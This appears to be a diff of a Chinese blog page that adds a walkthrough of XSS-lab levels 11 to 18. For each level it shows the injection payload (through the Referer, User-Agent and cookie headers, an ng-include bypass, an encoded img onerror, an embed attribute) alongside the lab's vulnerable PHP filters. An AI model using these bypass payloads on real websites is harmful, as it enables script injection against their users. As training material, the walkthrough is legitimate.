@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="xss,">
 
 
 
@@ -81,13 +81,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="soliym">
-<meta property="og:url" content="http://soliym.top/tags/vswitch/index.html">
+<meta name="description" content="xss注入与sql注入有很多相似之处，如果有sql学习的基础，那么学习xss将会很轻松，xss注入的方法总的来说就方面，一方面从js脚本入手，如果js方面的防御机制，可以考虑绕过，或者选择html的标签中的事件属性注入，本文并没有涉及flash xss攻击，flash xss会作为单独一章，而且也没有涉及存储型xss攻击，关于存储型xss会在dvwa中讲到">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-lab(11-18)详细讲解">
+<meta property="og:url" content="http://soliym.top/2020/05/06/xss-lab(11-18)详细讲解/index.html">
 <meta property="og:site_name" content="soliym">
+<meta property="og:description" content="xss注入与sql注入有很多相似之处，如果有sql学习的基础，那么学习xss将会很轻松，xss注入的方法总的来说就方面，一方面从js脚本入手，如果js方面的防御机制，可以考虑绕过，或者选择html的标签中的事件属性注入，本文并没有涉及flash xss攻击，flash xss会作为单独一章，而且也没有涉及存储型xss攻击，关于存储型xss会在dvwa中讲到">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-05-06T08:47:31.135Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="soliym">
+<meta name="twitter:title" content="xss-lab(11-18)详细讲解">
+<meta name="twitter:description" content="xss注入与sql注入有很多相似之处，如果有sql学习的基础，那么学习xss将会很轻松，xss注入的方法总的来说就方面，一方面从js脚本入手，如果js方面的防御机制，可以考虑绕过，或者选择html的标签中的事件属性注入，本文并没有涉及flash xss攻击，flash xss会作为单独一章，而且也没有涉及存储型xss攻击，关于存储型xss会在dvwa中讲到">
 
 
 
@@ -117,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://soliym.top/tags/vswitch/">
+  <link rel="canonical" href="http://soliym.top/2020/05/06/xss-lab(11-18)详细讲解/">
 
 
 
 
 
-  <title>标签: vswitch | soliym</title>
+  <title>xss-lab(11-18)详细讲解 | soliym</title>
   
 
 
@@ -142,7 +147,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -258,52 +263,286 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>vswitch<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://soliym.top/2020/05/06/xss-lab(11-18)详细讲解/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="soliym">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="soliym">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/04/19/open-vswitch/" itemprop="url">
-              
-                <span itemprop="name">open vswitch</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">xss-lab(11-18)详细讲解</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-19T12:56:10+08:00" content="2019-04-19">
-          04-19
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-06T16:47:10+08:00">
+                2020-05-06
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>xss注入与sql注入有很多相似之处，如果有sql学习的基础，那么学习xss将会很轻松，xss注入的方法总的来说就方面，一方面从js脚本入手，如果js方面的防御机制，可以考虑绕过，或者选择html的标签中的事件属性注入，本文并没有涉及flash xss攻击，flash xss会作为单独一章，而且也没有涉及存储型xss攻击，关于存储型xss会在dvwa中讲到</p>
+<a id="more"></a>
+<h6 id="第11关："><a href="#第11关：" class="headerlink" title="第11关："></a>第11关：</h6><p>这一关与上一关一样，需要盲猜注入的变量，通过逐个试探，只有t_sort才可以，回显信息，所以通过T_sort注入</p>
+<p>xss注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<p>通过测试，并没有注入成功，所以T_sort并不是接受的变量</p>
+<p>查看源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure>
+<p>通过查看源代码，我们知道所有的变量都是迷惑攻击者的，真正的输入点是在http的头部的</p>
+<p>使用bp抓包，然后修改http数据包的报头，注入代码</p>
+<p>在http的头部加入referer字段，该字段的值为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&quot; accesskey=&quot;x&quot; onload=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<p>然后页面会出现input框，点击后就会出现消息框</p>
+<p>本关的防御机制是通过隐藏输入点，如果攻击者不知道源码的情况下很难注入</p>
+<h6 id="第12关："><a href="#第12关：" class="headerlink" title="第12关："></a>第12关：</h6><p>这一关是有提示的，在html代码中的input下，变量名t_ua的值，是浏览器的版本，真好对应user-agent字段，所以猜测是通过http头部注入，上一关也应该是有的，不过没有注意到</p>
+<p>注入方法与上一关一样：抓包-修改-注入代码</p>
+<p>在http的头部修改user-agent字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<p>本关的防御机制与上一关一样</p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure>
+<p>是对尖括号有过滤的，所以采用事件注入</p>
+<h6 id="第13关："><a href="#第13关：" class="headerlink" title="第13关："></a>第13关：</h6><p>这一关没有提示，不能确定是否还是通过http注入，所以先试探几个变量是否可用。在试探的过程中发现T_cook是有内容的，所以我们猜测注入点是cookie</p>
+<p>通过抓包发现，cookie处的内容确实是t_cookie显示的内容，所以修改cookie的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=2&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure>
+<p>对尖括号有过滤，所以采用事件注入</p>
+<h6 id="第14关："><a href="#第14关：" class="headerlink" title="第14关："></a>第14关：</h6><p>这一关，没有注入点，整个页面是一个静态页面</p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不</span><br><span class="line">会自动跳转。成功者&lt;a href=/xss/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<h6 id="第15关："><a href="#第15关：" class="headerlink" title="第15关："></a>第15关：</h6><p>第15关html代码很少，找不到注入点，也不知道变量名，也没有提示，所以只能查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到的是，变量名是“src”，这也没有提示，确实猜不到</p>
+<p>通过试探，发现所有的输入都会被注视到 ngInclude: 1 之后，所以先了解一下 ngInclude它的作用</p>
+<p>ng-include 指令用于包含外部的 HTML 文件。</p>
+<p>包含的内容将作为指定元素的子节点。</p>
+<p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
+<p>也就是说它的参数是一个html页面</p>
+<p>先输入一个php页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php&apos;</span><br></pre></td></tr></table></figure>
+<p>发现在该页面会加载level1的页面，我们在15页面里面是没有注入点，但是在1页面里面有，尝试在1里面注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=1&lt;script&gt;alert(1)&lt;/script&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>并没有被执行，因为通过htmlspecialchars($str)函数，有些特殊字符被转码了，转为了html实体，所以我们采用其他标签的事件属性触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure>
+<h6 id="第16关："><a href="#第16关：" class="headerlink" title="第16关："></a>第16关：</h6><p>首先试探输入：</p>
+<script>alert(1)</script>
+
+<p>其中script被过滤了，然后大小写输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+<p>大小写也被过滤了，嵌套写入</p>
+<p>嵌套的部分被替换成了空格</p>
+<p>换标签输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>空格也被编码了</p>
+<p>空格采用url编码输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);`</span><br><span class="line"></span><br><span class="line">`$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);`</span><br><span class="line"></span><br><span class="line">`$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);`</span><br><span class="line"></span><br><span class="line">`$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);`</span><br><span class="line"></span><br><span class="line">`$str5=str_replace(&quot;     &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br></pre></td></tr></table></figure>
+<h6 id="第17关："><a href="#第17关：" class="headerlink" title="第17关："></a>第17关：</h6><p>从这一关开始应该是flash xss注入，但是这一关可以不采用，可以通过闭合注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=a&amp;arg02= onmouseover=javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>要注意的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p>这个语句是可以拆解的，”<embed src="xsf01.swf?" "="" width="100%" heigth="100%">“本身就是闭合的，所以不需要构造闭合，所以可以绕过htmlspecialchars该函数，因此，我们输入的才会被当成独立事件属性，不然就需要去构造闭合，而对于htmlspecialchars来说，双引号是特殊处理的，不能用来闭合，就像19关一样</p>
+<h6 id="第18关："><a href="#第18关：" class="headerlink" title="第18关："></a>第18关：</h6><p>与17关是一样的</p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>注：第17、18关都可以通过flash xss注入</p>
 
       
     </div>
+    
+    
+    
 
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="" alt="soliym wechat" style="width: 200px; max-width: 100%;">
+    <div></div>
+</div>
+
+      </div>
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    soliym
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://soliym.top/2020/05/06/xss-lab(11-18)详细讲解/" title="xss-lab(11-18)详细讲解">http://soliym.top/2020/05/06/xss-lab(11-18)详细讲解/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i>
+ xss</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/06/xss-lab(1-10)详细讲解/" rel="next" title="xss-lab(1-10)详细讲解">
+                <i class="fa fa-chevron-left"></i> xss-lab(1-10)详细讲解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -311,6 +550,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MTI2Ny8xNzgxNQ=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -331,8 +579,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -347,7 +604,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -358,7 +615,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -369,7 +626,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -442,6 +699,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-6"><a class="nav-link" href="#第11关："><span class="nav-number">1.</span> <span class="nav-text">第11关：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第12关："><span class="nav-number">2.</span> <span class="nav-text">第12关：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第13关："><span class="nav-number">3.</span> <span class="nav-text">第13关：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第14关："><span class="nav-number">4.</span> <span class="nav-text">第14关：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第15关："><span class="nav-number">5.</span> <span class="nav-text">第15关：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第16关："><span class="nav-number">6.</span> <span class="nav-text">第16关：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第17关："><span class="nav-number">7.</span> <span class="nav-text">第17关：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第18关："><span class="nav-number">8.</span> <span class="nav-text">第18关：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
         <div class="back-to-top">
@@ -453,9 +726,7 @@
       
      
     </div>
-    <div id="music163player">
-    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=2287797892&auto=1&height=430"></iframe>
-</div>
+   
   </aside>
 
 
@@ -466,7 +737,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -615,6 +886,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
 
   
 
@@ -643,6 +918,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
